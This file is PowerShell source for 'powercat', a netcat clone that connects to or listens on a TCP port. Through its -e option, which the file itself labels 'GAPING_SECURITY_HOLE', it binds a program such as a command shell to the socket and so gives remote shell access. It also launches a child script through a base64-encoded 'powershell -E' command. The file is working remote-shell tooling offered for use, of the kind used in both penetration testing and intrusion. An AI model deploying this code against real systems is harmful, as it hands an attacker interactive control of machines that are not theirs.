<#
  .SYNOPSIS
    Netcat: The powershell version.
  .PARAMETER c
    Client mode: Provide an server to connect to.
  .PARAMETER l
    Listen mode: Use this switch to create a listener.
  .PARAMETER p
    The port to listen on, or the port to connect to.
  .PARAMETER e
    GAPING_SECURITY_HOLE :)
#>
function powercat
{
  param(
    [string]$c="",
    [Parameter(Mandatory=$True,Position=-1)][string]$p="",
    [switch]$l=$False,
    [string]$e=""
  )
  
  if($l)
  {
    $Failure = $False
    netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $p){Write-Host ("The selected port " + $p + " is already in use.") ; $Failure=$True}}
    if($Failure){break}
  }
  if(($c -eq "") -and (!$l))
  {
    return "You must select either client mode (-c) or listen mode (-l)."
  }

  [console]::TreatControlCAsInput=$True
  
  if($e -eq "")
  {
    try
    {
      $StreamString = "
          `$Buffer = New-Object System.Byte[] 1
          `$Encoding = New-Object System.Text.AsciiEncoding
        
          `$StreamPipe = New-Object System.IO.Pipes.NamedPipeServerStream(`$StreamPipeName,[System.IO.Pipes.PipeDirection]::InOut,2,[System.IO.Pipes.PipeTransmissionMode]::Byte,[System.IO.Pipes.PipeOptions]::Asynchronous)
          `$StreamPipe.WaitForConnection()
          `$DestinationBuffer = New-Object System.Byte[] 1
          `$ReadOperation = `$StreamPipe.BeginRead(`$DestinationBuffer, 0, 1, `$null, `$null)
          `$StreamDestinationBuffer = New-Object System.Byte[] 1
          `$StreamReadOperation = `$Stream.ReadAsync(`$StreamDestinationBuffer, 0, 1)
          
          while(`$True)
          {
            if(`$ReadOperation.IsCompleted)
            {
              `$Stream.Write(`$DestinationBuffer, 0, 1)
              `$ReadOperation = `$StreamPipe.BeginRead(`$DestinationBuffer, 0, 1, `$null, `$null)
            }
            if(`$StreamReadOperation.IsCompleted)
            {
              if(`$StreamReadOperation.Result -eq 0){exit}
              Write-Host -n `$Encoding.GetString(`$StreamDestinationBuffer)
              `$StreamReadOperation = `$Stream.ReadAsync(`$StreamDestinationBuffer, 0, 1)
            }
          }
        }
        finally
        {
          exit
        }
      "
      
      $StreamPipeName = ("\\.\pipe\streampipe" + (Get-Random).ToString())
      
      if($l)
      {
        $StreamString = "
        try
        {
          `$Socket = New-Object System.Net.Sockets.TcpListener `$Port
          `$Socket.Start()
          `$Client = `$Socket.AcceptTcpClient()
          `$Stream = `$Client.GetStream()
        " + $StreamString
        $StreamString = ("`$Port='" + $p + "' ; " + "`$StreamPipeName='" + $StreamPipeName + "' ; " + $StreamString)
      }
      else
      {
        $StreamString = "
        try
        {
          `$Socket = New-Object System.Net.Sockets.TcpClient(`$Target,`$Port)
          if(`$Socket -eq `$null){Write-Error 'Unable To Connect'; return}
          `$Stream = `$Socket.GetStream()
        " + $StreamString
        $StreamString = ("`$Port='" + $p + "' ; " + "`$Target='" + $c + "' ; " + "`$StreamPipeName='" + $StreamPipeName + "' ; " + $StreamString)
      }
      
      $StreamBytes = [System.Text.Encoding]::Unicode.GetBytes($StreamString)
      $StreamEncodedCommand = [Convert]::ToBase64String($Streambytes)
      $Process = Start-Process powershell -NoNewWindow -ArgumentList @("-E",$StreamEncodedCommand)
      $ChildProcessId = (gwmi Win32_Process -Filter ("ParentProcessId = " + ([System.Diagnostics.Process]::GetCurrentProcess().Id).ToString()) | Where-Object {$_.ProcessName -eq "powershell.exe"}).ProcessId
      
      $StreamPipe = New-Object System.IO.Pipes.NamedPipeClientStream(".",$StreamPipeName,[System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::Asynchronous)
      $StreamPipe.Connect()
      $Encoding = New-Object System.Text.AsciiEncoding

      while((Get-Process -Id $ChildProcessId -ErrorAction SilentlyContinue) -ne $null)
      {
        if($Host.UI.RawUI.KeyAvailable)
        {
          $command = Read-Host
          $StreamPipe.Write($Encoding.GetBytes($command + "`r`n"),0,($command + "`r`n").Length)
        }
      }
    }
    finally
    {
      try{Stop-Process -Id $ChildProcessId 2>&1 | Out-Null}
      catch{}
    }
  }
  else
  {
    try
    {
      if($l)
      {
        Write-Verbose ("Listening on [0.0.0.0] (port " + $p + ")")
        $Socket = New-Object System.Net.Sockets.TcpListener $p
        $Socket.Start()
        $Client = $Socket.AcceptTcpClient()
        Write-Verbose ("Connection from [" + $Client.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $port + " [tcp] accepted (source port " + $Client.Client.RemoteEndPoint.Port + ")")
        $Stream = $Client.GetStream()
      }
      else
      {
        Write-Verbose "Connecting..."
        $Socket = New-Object System.Net.Sockets.TcpClient($c,$p)
        if($Socket -eq $null){Write-Error 'Unable To Connect'; return}

        Write-Verbose ("Connection to " + $c + ":" + $p + " [tcp] succeeeded!")
        $Stream = $Socket.GetStream()
      }
      
      $Buffer = New-Object System.Byte[] 1
      $Encoding = New-Object System.Text.AsciiEncoding

      $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
      $ProcessStartInfo.FileName = $e
      $ProcessStartInfo.UseShellExecute = $False
      $ProcessStartInfo.RedirectStandardInput = $True
      $ProcessStartInfo.RedirectStandardOutput = $True
      $ProcessStartInfo.RedirectStandardError = $True
      $Process = [System.Diagnostics.Process]::Start($ProcessStartInfo)
      $Process.Start() | Out-Null
      
      $ProcessDestinationBuffer = New-Object System.Char[] 1
      $ProcessReadOperation = $Process.StandardOutput.ReadAsync($ProcessDestinationBuffer, 0, 1)
      $StreamDestinationBuffer = New-Object System.Byte[] 1
      $StreamReadOperation = $Stream.ReadAsync($StreamDestinationBuffer, 0, 1)
      $ToStreamString = ""
       while($True)
      {
        if($ProcessReadOperation.IsCompleted)
        {
          try
          {
            $Stream.Write($Encoding.GetBytes($ProcessDestinationBuffer), 0, 1)
            $ProcessReadOperation = $Process.StandardOutput.ReadAsync($ProcessDestinationBuffer, 0, 1)
          }
          catch{}
        }

        if($StreamReadOperation.IsCompleted)
        {
          if($StreamReadOperation.Result -eq 0){break}
          if($StreamDestinationBuffer -eq 10)
          {
            $Process.StandardInput.WriteLine($ToStreamString)
            $StreamReadOperation = $Stream.ReadAsync($StreamDestinationBuffer, 0, 1)
            $ToStreamString = ""
          }
          else
          {
            $ToStreamString += $Encoding.GetString($StreamDestinationBuffer)
            $StreamReadOperation = $Stream.ReadAsync($StreamDestinationBuffer, 0, 1)
          }
        }
      }
    }
    finally
    {
      $Process | Stop-Process
      $Stream.Close()
      $Socket.Stop()
    }
  }
}